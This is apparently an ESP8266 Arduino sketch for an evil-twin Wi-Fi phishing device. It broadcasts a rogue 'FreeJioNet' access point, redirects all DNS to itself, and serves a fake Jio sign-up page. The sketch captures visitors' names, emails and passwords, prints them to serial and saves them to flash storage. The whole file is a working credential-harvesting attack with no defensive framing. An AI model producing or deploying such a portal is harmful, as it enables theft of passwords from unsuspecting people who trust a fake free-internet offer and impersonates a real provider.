#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String captivePortalHTML = ""
                            "<!DOCTYPE html>"
"<html lang='en'>"
"<head>"
"    <meta charset='UTF-8'>"
"    <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"    <title>Sign Up</title>"
"    <style>"
"        body {"
"            font-family: Arial, sans-serif;"
"            background-color: #f5f5f5;"
"            margin: 0;"
"            padding: 0;"
"            display: flex;"
"            justify-content: center;"
"            align-items: center;"
"            min-height: 100vh;"
"        }"

"        .container {"
"            background-color: #fff;"
"            border-radius: 8px;"
"            padding: 20px;"
"            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);"
"            max-width: 400px;"
"            width: 90%;"
"            text-align: center;"
"        }"

"        form {"
"            display: flex;"
"            flex-direction: column;"
"        }"

"        label {"
"            font-weight: bold;"
"        }"

"        input[type='text'],"
"        input[type='email'],"
"        input[type='password'] {"
"            width: 100%;"
"            padding: 10px;"
"            margin: 5px 0;"
"            border: 1px solid #ccc;"
"            border-radius: 4px;"
"        }"

"        input[type='submit'] {"
"            width: 100%;"
"            background-color: #007BFF;"
"            color: #fff;"
"            border: none;"
"            padding: 10px;"
"            margin-top: 10px;"
"            border-radius: 4px;"
"            cursor: pointer;"
"        }"

"        input[type='submit']:hover {"
"            background-color: #0056b3;"
"        }"

"        @media (max-width: 600px) {"
"            .container {"
"                width: 95%;"
"            }"
"        }"
"    </style>"
"</head>"
"<body>"
"    <div class='container'>"
//"        <img src='jio_logo.jpg' alt='Logo' style='width: 100px; height: 100px;'>"
"        <h2>Sign Up for your free Jio Internet</h2>"
"        <form id='signup-form' method='post' action='/submit'>"
"            <label for='username'>Enter Your Name:</label>"
"            <input type='text' id='username' name='username' required>"

"            <label for='email'>Email:</label>"
"            <input type='email' id='email' name='email' required>"

"            <label for='password'>Password:</label>"
"            <input type='password' id='password' name='password' required>"

"            <label for='cpassword'>Confirm Password:</label>"
"            <input type='password' id='cpassword' name='cpassword' required>"

"            <input type='submit' value='Sign Up'>"
"        </form>"
"    </div>"
"    <script>"
"        // Add JavaScript code for form validation or interactivity here"
"        const signupForm = document.getElementById('signup-form');"

"        signupForm.addEventListener('submit', function (event) {"
"            // Perform form validation or submission handling here"
"            // For example, prevent the default form submission:"
"            // event.preventDefault();"
"        });"
"    </script>"
"</body>"
"</html>";



void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("FreeJioNet");
  LittleFS.begin();
  // If DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS requests
  dnsServer.start(DNS_PORT, "*", apIP);

  // Handle captive portal requests with the captive portal HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", captivePortalHTML);
  });

  // Handle form submission on the signup page
  webServer.on("/submit", HTTP_POST, []() {
    String username = webServer.arg("username");
    String email = webServer.arg("email");
    String password = webServer.arg("password");

    // Send signup details to serial
    Serial.println("Received Signup Data:");
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Email: ");
    Serial.println(email);
    Serial.print("Password: ");
    Serial.println(password);
    // Create a new file or open an existing one for writing ("w" mode).
    File file = LittleFS.open("/myfile.txt", "w");

    if (file) {
        // Write data to the file.
        file.print("Username: ");
        file.println(username);
        file.print("Email: ");
        file.println(email);
        file.print("Password: ");
        file.println(password);
//        file.println("This is a sample text.");
        file.close();
        delay(1000); // Delay for a second to prevent rapid file creation.
    } 
    else {
        // Failed to open the file.
        Serial.println("Failed to open file for writing");
    }
    // Respond to the client with a success message within the captive portal page
    String successMessage = "Sign up successful!<br>";
    successMessage += "Username: " + username + "<br>";
    successMessage += "Email: " + email;

    captivePortalHTML.replace("<h2>Sign Up</h2>", successMessage);
    webServer.send(200, "text/html", captivePortalHTML);
  });

  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
